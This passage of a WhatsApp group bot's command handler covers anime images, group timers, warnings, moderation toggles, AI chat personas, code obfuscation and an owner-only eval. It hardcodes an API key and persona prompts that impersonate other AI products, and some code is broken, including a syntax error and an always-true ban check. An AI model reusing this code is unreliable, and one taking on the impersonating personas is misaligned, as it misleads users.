        await HeavstalTech.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (err) {
        await HeavstalTech.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        Vreply(`❌ API Error.`);
    }
}
break;
//=================================================//


//=================================================//  
case 'animewlp': 
case 'anime-wallpaper': {
    if (!isCreator) return Vreply(`Sorry, only the owner can use this command`);
    try {
        const response = await fetch(`https://nekos.life/api/v2/img/wallpaper`);
        const data = await response.json();
        await HeavstalTech.sendMessage(m.chat, { image: { url: data.url }, caption: mess.success }, { quoted: m });
    } catch {
        Vreply('Error!');
    }
}
break;
//=================================================//



//=================================================//
case 'animesearch': 
case 'anime-search': {
if (!isCreator) return Vreply(`Sorry, only the owner can use this command`)
if (!text) return Vreply(`Which anime are you lookin for?`)
const malScraper = require('mal-scraper')
    if (malScraper !== typeof function) return Vreply("Failed to continue search as the `mal-scraper` module had not been imported. ")
        const anime = await malScraper.getInfoFromName(text).catch(() => null)
        if (!anime) return Vreply(`Could not find`)
let animetxt = `
🎀 *Title: ${anime.title}*
🎋 *Type: ${anime.type}*
🎐 *Premiered on: ${anime.premiered}*
💠 *Total Episodes: ${anime.episodes}*
📈 *Status: ${anime.status}*
💮 *Genres: ${anime.genres}
📍 *Studio: ${anime.studios}*
🌟 *Score: ${anime.score}*
💎 *Rating: ${anime.rating}*
🏅 *Rank: ${anime.ranked}*
💫 *Popularity: ${anime.popularity}*
♦️ *Trailer: ${anime.trailer}*
🌐 *URL: ${anime.url}*
❄ *Description:* ${anime.synopsis}*`
                await HeavstalTech.sendMessage(m.chat,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
                }
                break;
//=================================================//               


//=================================================//
case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'shinobu': case 'handhold': {
    if (!isCreator) return Vreply(mess.owner);
    try {
        const response = await fetch(`https://api.waifu.pics/sfw/${command}`);
        const { url } = await response.json();
        await HeavstalTech.sendVideoAsSticker(from, url, m, { packname: global.packname, author: global.author });
    } catch {
        Vreply('Error!');
    }
}
break;
//=================================================//


//=================================================//
 case 'closetime': {    
    if (!m.isGroup) return Vreply(mess.only.group)
    if (!isCreator) return Vreply(mess.owner);
    let unit = args[1];
    let value = Number(args[0]);
    if (!value) return Vreply("*Usage:* closetime <number> <second/minute/hour/day>\n\n*Example:* 10 minute");
    let timer;
    if (unit === 'second') {
        timer = value * 1000;
    } else if (unit === 'minute') {
        timer = value * 60000;
    } else if (unit === 'hour') {
        timer = value * 3600000;
    } else if (unit === 'day') {
        timer = value * 86400000;
    } else {
        return Vreply('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example:*\n10 minute');
    }
    Vreply(`⏳ Close Time ${value} ${unit} starting from now...`);
    setTimeout(async () => {
        try {
            await HeavstalTech.groupSettingUpdate(m.chat, 'announcement');
            Vreply(`✅ *On time!* Group has been closed by Admin\nNow only Admins can send messages.`);
        } catch (e) {
            Vreply('❌ Failed: ' + e.message);
        }
    }, timer);
}
break;
//=================================================//


//=================================================//
case 'opentime': {    
    if (!m.isGroup) return Vreply(mess.only.group)
    if (!isCreator) return Vreply(mess.owner);
    let unit = args[1];
    let value = Number(args[0]);
    if (!value) return Vreply('*Usage:* opentime <number> <second/minute/hour/day>\n\n*Example:* 5 second');
    let timer;
    if (unit === 'second') {
        timer = value * 1000;
    } else if (unit === 'minute') {
        timer = value * 60000;
    } else if (unit === 'hour') {
        timer = value * 3600000;
    } else if (unit === 'day') {
        timer = value * 86400000;
    } else {
        return Vreply('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example:*\n5 second');
    }

    Vreply(`⏳ Open Time ${value} ${unit} starting from now...`);

    setTimeout(async () => {
        try {
            await HeavstalTech.groupSettingUpdate(m.chat, 'not_announcement');
            Vreply(`✅ *On time!* Group has been opened by Admin\nNow members can send messages.`);
        } catch (e) {
            Vreply('❌ Failed: ' + e.message);
        }
    }, timer);
}
break;
//=================================================//


//=================================================//    
case 'listonline':
case 'list-online': {
if (!isCreator) return Vreply(mess.owner);
        if (!m.isGroup) return Vreply(mess.only.group);
        HeavstalTech.sendMessage(from, { react: { text: "✅", key: m.key } })
        let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
        let online = [...Object.keys(store.presences[id]), botNumber]
        let liston = 1
        HeavstalTech.sendText(m.chat, ' 「Members Online」\n\n' + online.map(v => `${liston++} . @` + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
      }
      break;
//=================================================//      

      
//=================================================//     
case 'setpersona': {
    if (!isCreator) return Vreply(mess.owner);
    if (!text) return Vreply(`*Current Persona:*\n${global.ai_persona}\n\n*Usage:* ${prefix}setpersona You are a rude cat.\n\n*This command is used to set the AI's Personality (Persona)\n\n${footer}`);
    global.ai_persona = text;
    Vreply(`*✅ Main AI Persona Updated!*`);
}
break;
//=================================================//


//=================================================//
case 'setpersona2':
case 'setmode': {
    if (!isCreator) return Vreply(mess.owner);
    const availableModes = [
        "philosopher", "sassy", "fun", "roast", "neutral", 
        "nerd", "therapist", "gangster", "poet"
    ];
    if (!text || !availableModes.includes(text.toLowerCase())) {
        let list = availableModes.map((m, i) => `${i + 1}. ${m.charAt(0).toUpperCase() + m.slice(1)}`).join("\n");
        return Vreply(`*INVALID INPUT*\n\n> *Please select a personality from the list:*\n\n${list}\n\n*Current Mode:* ${global.ai2_mode}\n*Example:* ${prefix}setpersona2 sassy\n\n${footer}`);
    }
    global.ai2_mode = text.toLowerCase();
    Vreply(`*✅ AI-2 Mode Switched To:* ${text.toUpperCase()}`);
}
break;  
//=================================================//

          
//=================================================//      
case 'gpt4': 
case 'openai': 
case 'xai':
case 'jeden':
case 'copilot':
case 'meta-ai':
case 'gemini': {
    if (!text) return Vreply(`*Enter A Query*\n\nExample: ${prefix + command} Meaning of overwhelming`);
    Vreply(mess.wait)
await loading();
    try {
        const apiKey = HT_API_KEY;
        let specificPersona = "";
        switch (command) {
            case 'gpt4':
            case 'openai':
                specificPersona = "You are GPT-4, a highly advanced language model developed by OpenAI. You are professional, extremely intelligent, and provide comprehensive, detailed answers. Maintain a formal yet helpful tone.";
                break;
            case 'xai':
                specificPersona = "You are xAI (Grok), an AI built to understand the universe. You are witty, slightly rebellious, and focused on absolute truth. You are direct and don't use unnecessary filler words.";
                break;
            case 'copilot':
                specificPersona = "You are Copilot, an AI companion by Microsoft. Your goal is to increase productivity. You are precise, efficient, and great at technical explanations and coding assistance.";
                break;
            case 'meta-ai':
                specificPersona = "You are Meta AI, a friendly and social assistant. You are designed to be conversational, engaging, and helpful. Keep your answers concise and easy to read.";
                break;
            case 'gemini':
                specificPersona = "You are Gemini, a multimodal AI from Google. You are creative, informative, and innovative. You explain complex topics in simple, easy-to-understand terms.";
                break;
            case 'jeden':
            default:
                specificPersona = `You are Jeden, a superior AI model developed by Heavstal Tech. You are the core intelligence of the Verselor system. You serve ${global.ownername} and answer with authority and precision.`;
                break;
        }
        const response = await fetch('https://heavstal-tech.vercel.app/api/v1/jeden', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'x-api-key': apiKey
            },
            body: JSON.stringify({
                prompt: text,
                persona: specificPersona
            })
        });
        const res = await response.json();
        if (res.status === 'success' && res.data && res.data.response) {
            await Vreply(res.data.response);
        } else {
            await Vreply(`*API Error:* Failed to get a response from the AI.`);
        }
    } catch (e) {
        console.error("AI Error:", e);
        Vreply(mess.error.fitur);
    }
}
break;
//=================================================//


//=================================================//
case 'ai2': {
    if (!text) return Vreply(`*Talk to the ${global.ai2_mode.toUpperCase()} AI*\n\n*Current Mode:* ${global.ai2_mode}\n*Change Mode:* ${prefix}setpersona2\n\n*Example:* ${prefix}ai2 How do I cook rice?`);
    Vreply(mess.wait)
await loading();
    const personalities = {
        "philosopher": `You are ${global.AiName}, created by ${global.AiOwner}. You are a deep thinker. Answer every question with philosophical depth, existential quotes, and profound wisdom. questioning the nature of reality.`,
        "sassy": `You are ${global.AiName}, created by ${global.AiOwner}. You are extremely sassy, sarcastic, and have an attitude. You answer questions but always add a snarky comment or a burn.`,
        "fun": `You are ${global.AiName}, created by ${global.AiOwner}. You are the life of the party! Use lots of emojis 🎉, be super enthusiastic, energetic, and purely fun. No negativity allowed!`,
        "roast": `You are ${global.AiName}. Your goal is to roast the user. Answer their question but insult their intelligence, grammar, or life choices while doing so. Be mean but funny.`,
        "neutral": `You are ${global.AiName}, a helpful and objective AI assistant created by ${global.AiOwner}. Provide clear, factual, and concise answers.`,
        "nerd": `You are ${global.AiName}. You are a hardcore tech nerd. Use technical jargon, reference coding, sci-fi movies, and act intellectually superior but helpful.`,
        "therapist": `You are ${global.AiName}. You are a gentle, empathetic listener. Validate the user's feelings, speak softly, and offer comforting advice.`,
        "gangster": `Yo, you are ${global.AiName}. You speak in street slang, use "fam", "blud", "homie". Keep it real and street-smart.`,
        "poet": `You are ${global.AiName}. You must answer every single query in the form of a rhyming poem or Haiku.`
    };
    const systemPrompt = personalities[global.ai2_mode] || personalities["neutral"];
    try {
        const response = await fetch('https://heavstal-tech.vercel.app/api/v1/jeden', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'x-api-key': HT_API_KEY },
            body: JSON.stringify({
                prompt: text,
                persona: systemPrompt
            })
        });
        const res = await response.json();
        if (res.status === 'success') {
            await Vreply(res.data.response);
        } else {
            await Vreply(`*API Error:* ${res.error}`);
        }
    } catch (e) {
        console.error(e);
        Vreply(mess.error.fitur);
    }
}
break;
//=================================================//


//=================================================//
case 'ai': {
    if (!text) return Vreply(`*Enter A Query*\n\nExample: ${prefix + command} Who is Elon Musk?`);
    Vreply(mess.wait)
await loading();
    try {
        const response = await fetch('https://heavstal-tech.vercel.app/api/v1/jeden', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'x-api-key': HT_API_KEY },
            body: JSON.stringify({
                prompt: text,
                persona: global.ai_persona
            })
        });
        const res = await response.json();
        if (res.status === 'success') {
            await Vreply(res.data.response);
        } else {
            await Vreply(`*API Error:* ${res.error}`);
        }
    } catch (e) {
        console.error(e);
        Vreply(mess.error.fitur);
    }
}
break;
//=================================================//


//=================================================//
case 'quote': {
    try {
        const res = await fetch('https://zenquotes.io/api/random');
        const json = await res.json();
        const quote = json[0].q;
        const author = json[0].a;

        // Optional: Generate image using API
        const quoteImg = `https://dummyimage.com/600x400/000/fff.png&text=${encodeURIComponent(`"${quote}"\n\n- ${author}`)}`;

        HeavstalTech.sendMessage(m.chat, {
            image: { url: quoteImg },
            caption: `_"${quote}"_\n\n— *${author}*`
        }, { quoted: m });

    } catch (err) {
        Vreply('Failed to fetch quote.');
    }
}
break;
//=================================================//


//=================================================//
case 'joke': {
  let res = await fetch('https://v2.jokeapi.dev/joke/Any?type=single'); 
  let data = await res.json();
  await HeavstalTech.sendMessage(m.chat, {
    image: { url: 'https://files.catbox.moe/gr1jfa.jpg' },
    caption: `*😂 Here's a joke for you:*\n\n${data.joke}`
  }, { quoted: m });
}
break;
//=================================================//



//=================================================//
case 'myjid': 
case 'my-jid': {
            Vreply(from)
           }
          break;
//=================================================//          


//=================================================//
case "rwaifu": {
if (!global.db.data.chats[m.chat]?.nsfw) return Vreply(mess.nsfw);
if (!isCreator) return Vreply(mess.owner);
    const imageUrl = `https://apis.davidcyriltech.my.id/random/waifu`;
    await HeavstalTech.sendMessage(m.chat, {
        image: { url: imageUrl },
        caption: "Your rwaifu by ${botname}"
      }, { quoted: m }); // Add quoted  for context
      }
      break;
//=================================================//

      
//=================================================//     
case 'waifu2': 
case 'waifu': {
    if (!isCreator) return Vreply(mess.owner);
    if (!global.db.data.chats[m.chat]?.nsfw) return Vreply(mess.nsfw);
    try {
        const response = await fetch(`https://api.waifu.pics/nsfw/waifu`);
        const data = await response.json();
        await HeavstalTech.sendMessage(from, { 
            image: { url: data.url }, 
            caption: `Your waifu by ${botname}` 
        }, { quoted: m });
    } catch {
        Vreply('Error!');
    }
}
break;
//=================================================//
        

//=================================================//
case 'checkwarn':
case 'warns': {
    if (!m.isGroup) return Vreply(mess.only.group);

    const target = m.mentionedJid[0] || m.quoted?.sender || m.sender; 
    if (!global.db.data.chats[m.chat]) global.db.data.chats[m.chat] = {};
    if (!global.db.data.chats[m.chat].warnings) global.db.data.chats[m.chat].warnings = {};
    
    const currentWarns = global.db.data.chats[m.chat].warnings[target] || 0;
    const maxWarns = global.warnLimit || 3;
    const msg = `*⚠️ WARNING STATUS*\n\n` +
                `👤 *User:* @${target.split('@')[0]}\n` +
                `📊 *Current Warnings:*[ ${currentWarns} / ${maxWarns} ]\n\n` +
                `_Note: Reaching the limit will result in an automatic kick._`;
                
    Vreply(msg, { mentions: [target] });
}
break;
//=================================================//

        
//=================================================//
case 'setwarn': {
    if (!m.isGroup) return Vreply(mess.only.group);
    if (!isAdmin && !isCreator) return Vreply(mess.only.admin);
    if (!text) return Vreply(`*Current Limit:* ${global.warnLimit}\n\n*Usage:* ${prefix}setwarn 5`);
    if (isNaN(text)) return Vreply("Please enter a valid number.");
    global.warnLimit = parseInt(text);
    Vreply(`*✅ Warning limit updated to ${text}*`);
}
break;
//=================================================//

//=================================================//
case 'resetwarn':
case 'delwarn': {
    if (!m.isGroup) return Vreply(mess.only.group);
    if (!isAdmin && !isCreator) return Vreply(mess.only.admin);
    const target = m.mentionedJid[0] || m.quoted?.sender;
    if (!target) return Vreply("Reply to or tag a user to reset their warnings.");
    if (!global.db.data.chats[m.chat]) global.db.data.chats[m.chat] = {};
    if (!global.db.data.chats[m.chat].warnings) global.db.data.chats[m.chat].warnings = {};
    if (!global.db.data.chats[m.chat].warnings[target] || global.db.data.chats[m.chat].warnings[target] === 0) {
        return Vreply(`@${target.split('@')[0]} currently has 0 warnings.`, { mentions: [target] });
    }
    delete global.db.data.chats[m.chat].warnings[target];
    await global.db.write(); 
    Vreply(`*✅ Warnings successfully reset for @${target.split('@')[0]}*`, { mentions: [target] });
}
break;
//=================================================//


//=================================================//
case 'antilink':
case 'antibot':
case 'antibadword': {
    if (!m.isGroup) return Vreply(mess.only.group);
    if (!isAdmin && !isCreator) return Vreply(mess.only.admin);
    if (!isBotAdmin) return Vreply(mess.badmin);
    
    const mode = args[0] ? args[0].toLowerCase() : '';
    const allowedModes = ['delete', 'warn', 'kick', 'off'];
    
    // Lazy Init Chat
    if (!global.db.data.chats[m.chat]) global.db.data.chats[m.chat] = {};

    if (!allowedModes.includes(mode)) {
        const current = global.db.data.chats[m.chat][command] || 'off';
        return Vreply(`*🛡️ ${command.toUpperCase()} Configuration*\n\n*Current Mode:* ${current}\n\n*Available Modes:*\n- ${prefix}${command} delete\n- ${prefix}${command} warn\n- ${prefix}${command} kick\n- ${prefix}${command} off`);
    }

    // Save directly to RAM
    global.db.data.chats[m.chat][command] = mode;
    await global.db.write();
    Vreply(`*✅ ${command.toUpperCase()} set to:* ${mode.toUpperCase()}`);
}
break;
//=================================================//


//=================================================//
case 'antidelete': {
    if (!m.isGroup) return Vreply(mess.only.group);
    if (!isAdmin && !isCreator) return Vreply(mess.only.admin);
    if (!global.db.data.chats[m.chat]) {
    global.db.data.chats[m.chat] = {};
          }
          
    if (args[0] === 'on') {
        if (global.db.data.chats[m.chat].antidelete) return Vreply(`*Anti-Delete is already ACTIVE in this group!*`);
        global.db.data.chats[m.chat].antidelete = true;
        await global.db.write();
        Vreply(`*✅ Anti-Delete has been ENABLED!*\n\nbot will now automatically repost any deleted messages in this group.`);
    } else if (args[0] === 'off') {
        if (!global.db.data.chats[m.chat].antidelete) return Vreply(`*Anti-Delete is already INACTIVE!*`);
        global.db.data.chats[m.chat].antidelete = false;
        await global.db.write();
        Vreply(`*❌ Anti-Delete has been DISABLED!*`);
    } else {
        Vreply(`*Please select an option:*\n\n${prefix + command} on\n${prefix + command} off`);
    }
}
break;
//=================================================//


//=================================================//
case 'addbadword': {
    if (!isCreator && !isAdmin) return Vreply(mess.only.admin);
    if (!text) return Vreply(`*Usage:* ${prefix}addbadword stupid`);
    if (!global.db.data.settings) {
         global.db.data.settings = {};
           }
    if (!global.db.data.settings.badwords) global.db.data.settings.badwords = [];
    const word = text.toLowerCase().trim();
    if (global.db.data.settings.badwords.includes(word)) return Vreply("❌ Word is already in the list.");
    global.db.data.settings.badwords.push(word);
    await global.db.write();
    Vreply(`*✅ Added "${word}" to bad words list.*`);
}
break;
//=================================================//


//=================================================//
case 'delbadword': {
    if (!isCreator && !isAdmin) return Vreply(mess.only.admin);
    if (!text) return Vreply(`*Usage:* ${prefix}delbadword stupid`);
    if (!global.db.data.settings.badwords) { 
         global.db.data.settings.badwords = [];
       }
    if (!global.db.data.settings.badwords) return Vreply("❌ List is empty.");
    const word = text.toLowerCase().trim();
    const index = global.db.data.settings.badwords.indexOf(word);
    if (index === -1) return Vreply("❌ Word not found in list.");
       global.db.data.settings.badwords.splice(index, 1);
       await global.db.write();
    Vreply(`*✅ Removed "${word}" from bad words list.*`);
}
break;
//=================================================//


//=================================================//
case 'listbadword': {
    if (!isCreator && !isAdmin) return Vreply(mess.only.admin);
    const list = global.db.data.settings?.badwords || [];
    if (list.length === 0) return Vreply("No bad words set.");
    let msg = `*🤬 Bad Words List:*\n\n` + list.map((w, i) => `${i+1}. ${w}`).join('\n');
    Vreply(msg);
}
break;
//=================================================//


//=================================================//
case 'anticall': {
    if (!isCreator) return Vreply(mess.owner);
    if (!text) return Vreply(`*Anti-Call Configuration*\n\nSelect Mode:\n1. ${prefix}anticall off\n2. ${prefix}anticall reject\n3. ${prefix}anticall block`);
    const mode = args[0].toLowerCase();
if (['off', 'reject', 'block'].includes(mode)) {
    global.db.data.settings.anticall = mode;
    await global.db.write();
    Vreply(`*✅ Anti-Call has been set to:* ${mode.toUpperCase()}`);
    } else {
        Vreply(`*Invalid Mode!* Use: off, reject, or block.`);
    }
}
break;
//=================================================//


//=================================================//
case 'welcome': {
    if (!m.isGroup) return Vreply(mess.only.group);
    if (!isAdmin && !isCreator) return Vreply(mess.only.admin);
    
        if (!global.db.data.chats[m.chat]) {
        global.db.data.chats[m.chat] = {};
        }

    if (args[0] === 'on') {
        global.db.data.chats[m.chat].welcome = true;
        await global.db.write();
        Vreply(`*✅ Welcome Messages Enabled*`);
    } else if (args[0] === 'off') {
        global.db.data.chats[m.chat].welcome = false;
        await global.db.write();
        Vreply(`*❌ Welcome Messages Disabled*`);
    } else {
        Vreply(`*Usage:* ${prefix}welcome on/off`);
    }
}
break;
//=================================================//


//=================================================//
case 'goodbye': {
    if (!m.isGroup) return Vreply(mess.only.group);
    if (!isAdmin && !isCreator) return Vreply(mess.only.admin);
    
    if (!global.db.data.chats[m.chat]) {
        global.db.data.chats[m.chat] = {};
        }

    if (args[0] === 'on') {
        global.db.data.chats[m.chat].goodbye = true;
        await global.db.write();
        Vreply(`*✅ Goodbye Messages Enabled*`);
    } else if (args[0] === 'off') {
        global.db.data.chats[m.chat].goodbye = false;
        await global.db.write();
        Vreply(`*❌ Goodbye Messages Disabled*`);
    } else {
        Vreply(`*Usage:* ${prefix}goodbye on/off`);
    }
}
break;
//=================================================//


//=================================================//
case 'group-events': {
    if (!m.isGroup) return Vreply(mess.only.group);
    if (!isAdmin && !isCreator) return Vreply(mess.only.admin);
    
    if (!global.db.data.chats[m.chat]) {
        global.db.data.chats[m.chat] = {};
        }
    if (args[0] === 'on') {
        global.db.data.chats[m.chat].events = true;
        await global.db.write();
        Vreply(`*✅ Group Events Enabled*\n(Promote, Demote, Settings Change, Name Change)`);
    } else if (args[0] === 'off') {
        global.db.data.chats[m.chat].events = false;
        await global.db.write();
        Vreply(`*❌ Group Events Disabled*`);
    } else {
        Vreply(`*Usage:* ${prefix}events on/off\n\n_Detects: Promote, Demote, Name Change, Description Change, Group Open/Close_`);
    }
}
break;
//=================================================//


//=================================================//
case 'gimage': 
case 'gptimage': {
    if (!text) return Vreply(`Provide an image description\n\nExample: ${prefix}gptimage A futuristic logo with the name HEAVSTAL TECH`)
    Vreply(mess.wait)
await loading();
    const gpt1image = async (yourImagination) => {
        const headers = {
            "content-type": "application/json",
            "referer": "https://gpt1image.exomlapi.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
        }
        const body2 = JSON.stringify({
            "prompt": yourImagination,
            "n": 1,
            "size": "1024x1024",
            "is_enhance": true,
            "response_format": "url"
        })
        const response = await fetch("https://gpt1image.exomlapi.com/v1/images/generations", {
            headers,
            body2,
            method: "POST"
        })
        if (!response.ok) throw Error(`fetch failed at address ${response.url} ${response.status} ${response.statusText}.`)
        const json = await response.json()
        const url = json?.data?.[0]?.url
        if (!url) throw Error(" fetch successful but result url is empty" + (json.error ? ", error from server : " + json.error : "."))
        return url
    }
    try {
        const imageUrl = await gpt1image(text)
        await HeavstalTech.sendMessage(m.chat, {
            image: { url: imageUrl }
        }, { quoted: m })
    } catch (error) {
        Vreply(`${error.message}`)
    }
}
break;
//=================================================//


//=================================================//
case 'encrypt':
case 'obfuscate': 
case 'enc': 
case 'obf': {
    let codeContent = '';
    let language = 'js';
    let outputFileName = 'encrypted_script.js';
    let isFile = false;
    
    const quoted = m.quoted ? m.quoted : null;
    const mime = (quoted?.msg || quoted)?.mimetype || '';
    if (quoted && /document/.test(mime)) {
        const originalName = quoted.fileName || "unknown.js";
        if (originalName.endsWith('.py')) {
            language = 'py';
            outputFileName = originalName.replace('.py', '_enc.py');
        } else if (originalName.endsWith('.java')) {
            language = 'java';
            outputFileName = originalName.replace('.java', '_enc.java');
        } else {
            language = 'js';
            outputFileName = originalName.replace(/\.js$/, '') + '_obf.js';
        }
        const mediaBuffer = await HeavstalTech.downloadMediaMessage(quoted);
        codeContent = mediaBuffer.toString('utf-8');
        isFile = true;
    } 
    else if (quoted && quoted.text) {
        codeContent = quoted.text;
        if (codeContent.includes('def ') && codeContent.includes(':')) language = 'py';
        else if (codeContent.includes('public class') || codeContent.includes('System.out')) language = 'java';
    } 
    else if (text) {
        codeContent = text;
        if (codeContent.includes('def ') && codeContent.includes(':')) language = 'py';
        else if (codeContent.includes('public class') || codeContent.includes('System.out')) language = 'java';
    } 
    else {
        return Vreply(`*Encryptor*\n\nUsage:\n1. Reply to a file (.js, .py, .java) with ${prefix + command}\n2. Reply to a code block with ${prefix + command}\n3. Type code after command: ${prefix + command} console.log("Test")`);
    }
    Vreply(mess.wait)
await loading();
    try {
        const apiKey = HT_API_KEY 
        const response = await fetch('https://heavstal-tech.vercel.app/api/v1/codex', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'x-api-key': apiKey
            },
            body: JSON.stringify({ 
                code: codeContent, 
                lang: language 
            })
        });
        const res = await response.json();
        if (res.status === 'success' && res.data) {
            const encryptedResult = res.data.encrypted_code;
            const detectedLang = res.data.language;
            if (encryptedResult.length > 2000 || isFile) {
                await HeavstalTech.sendMessage(m.chat, {
                    document: Buffer.from(encryptedResult, 'utf-8'),
                    fileName: outputFileName,
                    mimetype: 'text/plain',
                    caption: `*🔒 Encrypted Successfully*\n\n*Language:* ${detectedLang}\n*Protection:* CODE-X Enterprise\n\n${footer}`
                }, { quoted: m });
            } else {
                await HeavstalTech.sendMessage(m.chat, {
                    text: encryptedResult
                }, { quoted: m });
            }
        } else {
            await Vreply(`*Encryption Failed*\n\nError: ${res.message || "Unknown API Error"}`);
        }
    } catch (e) {
        console.error("API Error:", e);
        Vreply(`*Error:* An unexpected error occurred while processing the code.`);
    }
}
break;
//=================================================//


//=================================================//
case 'pixabay': {
  if (!text) {
    return Vreply(` *Pixabay Image Search*\n\n*Example:* ${prefix}pixabay A flying bird.`);
  }
  const waitMsg = await Vreply(` *Searching Pixabay* \n\n▰▱▱▱▱▱▱▱▱▱ 25%\nLooking for "${text}"...`);
  const url = `https://api.nexoracle.com/search/pixabay-images?apikey=63b406007be3e32b53&q=${encodeURIComponent(text)}`;

  try {
    const res = await fetch(url);
    const data = await res.json();

    if (!data?.result?.length) {
      return Vreply(`*No Images Found* ❌\n\nCouldn't find Pixabay images for:\n"${text}"\n\n• Try different keywords\n• Use English terms for best results.`);
    }

    for (let i = 0; i < Math.min(data.result.length, 5); i++) {
      await sendImage(data.result[i], `🖼️ Image ${i+1} for "${text}"`);
      if (i < 4) await delay(500);
    }

    await react('✅');

  } catch (e) {
    console.error('Pixabay error:', e);
    Vreply(' Failed to fetch images. Try again later.');
  }

  break;
}
//=================================================//


//=================================================//
case 'pin': 
case 'pinterest': {
  if (!text) return Vreply(` *Example:* ${prefix}pinterest MONEY`);
  try {
    const res = await fetch(`https://fastrestapis.fasturl.cloud/search/pinterest/simple?name=${encodeURIComponent(text)}`);
    const data = await res.json();

    if (data.status !== 200 || !Array.isArray(data.result)) {
      return Vreply('❌ Failed to fetch Pinterest images.');
    }

    const pick = data.result[Math.floor(Math.random() * data.result.length)];
    const caption = `🎀 *Pinterest Result*\n\n📌 *Title:* ${pick.title || 'N/A'}\n🖼️ *Alt Text:* ${pick.altText || 'N/A'}\n💬 *Description:* ${pick.description || 'N/A'}\n🔗 *Link:* ${pick.link}`;

    await HeavstalTech.sendMessage(m.chat, {
      image: { url: pick.directLink },
      caption: caption
    }, { quoted: m });

  } catch (e) {
    console.error('[PINTEREST ERROR]', e);
    Vreply(' Error fetching Pinterest data. Try again later.');
  }
  break;
}
//=================================================//


//=================================================//
case 'eval': {
 if (!isCreator) return Vreply(mess.owner);
  try {
    let evaled = await eval(`(async () => { ${text} })()`);
    if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
    Vreply(evaled);
  } catch (err) {
    Vreply(`Error:\n${err}`);
  }
}
break;
//=================================================//


//=================================================//
case 'promoteall': {    
    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
    try {
        if (!m.isGroup) return Vreply(mess.only.group);
        if (!isAdmin && !isOwner) return Vreply("Only Admins And Bot Owner Can Access This Command");
        const groupMetadata = await HeavstalTech.groupMetadata(m.chat);
        const participants = groupMetadata.participants;
        const participantsToPromote = participants.filter(p => !p.admin);

        if (participantsToPromote.length === 0) return Vreply(`*No participants found to promote.*`);

        for (let p of participantsToPromote) {
            try {
                await HeavstalTech.groupParticipantsUpdate(m.chat, [p.id], 'promote');
                await sleep(1500);
            } catch (err) {
                console.error(`Error promoting ${p.id}:`, err);
            }
        }

        Vreply(`*Success: All eligible members have been promoted.*`);
    } catch (error) {
        console.error(`Error in 'promoteall':`, error);
        Vreply(`*An error occurred while processing the 'promoteall' command.*`);
    }
    break;
}
//=================================================//


//=================================================//
case 'demoteall': {
    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
    try {
        if (!m.isGroup) return Vreply(mess.only.group);
        if (!isAdmin && !isOwner) return Vreply("Only Admins And Bot Owner Can Access This Command");       
        const groupMetadata = await HeavstalTech.groupMetadata(m.chat);
        const participants = groupMetadata.participants;
        const participantsToDemote = participants.filter(p => p.admin && p.id !== BotNum && p.id !== ownernumber);

        if (participantsToDemote.length === 0) return Vreply(`*No admins found to demote.*`);

        for (let p of participantsToDemote) {
            try {
                await HeavstalTech.groupParticipantsUpdate(m.chat, [p.id], 'demote');
                await sleep(1500);
            } catch (err) {
                console.error(`Error demoting ${p.id}:`, err);
            }
        }

        Vreply(`*Success: All eligible admins have been demoted.*`);
    } catch (error) {
        console.error(`Error in 'demoteall':`, error);
        Vreply(`*An error occurred while processing the 'demoteall' command.*`);
    }
    break;
}
//=================================================//


//=================================================//
case 'pickupline':
case 'rizz': {
 try {
 // Fetch the pickup line from the API
 let res = await fetch(`https://api.popcat.xyz/pickuplines`);
 if (!res.ok) {
 throw new Error(`API request failed with status ${res.status}`);
 }
 
 let json = await res.json();
 let pickupLine = `*Here's a pickup line for you 😘💖:*\n\n${json.pickupline} 😂❤️`;

 // Image URL to use
 const imageUrl = 'https://files.catbox.moe/oulude.jpg';

 
 // Send the message with the image, caption, and footer
 await HeavstalTech.sendMessage(m.chat, {
 image: { url: imageUrl },
 caption: pickupLine,
 footer: footer
 });
 } catch (error) {
 console.error('Error in pickupline command:', error);
 Vreply('Failed to fetch a pickup line. Please try again later.');
 }
}
break;
//=================================================//


//=================================================//
case 'resetgclink':
case 'revoke': {
if (!isOwner) return Vreply(mess.owner)
if (!m.isGroup) return Vreply(mess.only.group)
if (m.isGroup && !isBotAdmin) return Vreply(mess.badm)
Vreply(`You Are About To Reset This Group Link!. You Have 5 seconds to restart bot to stop this process. Use ${prefix}restart to stop this process`)
await sleep(5000) // 5 seconds delay
HeavstalTech.groupRevokeInvite(from)
Vreply("Successfully Reset Group Link");
}
break;
//=================================================//


//=================================================//
case 'fact': {
    try {
        const response = await fetch(`https://nekos.life/api/v2/fact`);
        const data = await response.json();
        return Vreply(`❄️ *Fact:* ${data.fact}\n`);
    } catch {
        Vreply('Error!');
    }
}
break;
//=================================================//
 

//=================================================//
case "ban": case "banuser": {
if (!isOwner) return Vreply(mess.owner);
let Promise = ['2348137256404', '08166546725']
if (text) {
if ((m.mentionedJid && m.mentionedJid.length> 0) || m.quoted) {
    return Vreply(usageMessage);
}
let orang = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
if (orang === BotNum) return Vreply('*I Cannot Ban Myself*')
if (orang.includes(Promise) +"@s.whatsapp.net") return Vreply('*ACCESS DENIED*\n\nBot Developers Cannot Banned')
if (ban.includes(orang)) return Vreply(`*${orang.split('@')[0]} Has Already Been Banned\n\n${footer}*`)
await ban.push(orang)
await global.db.write();
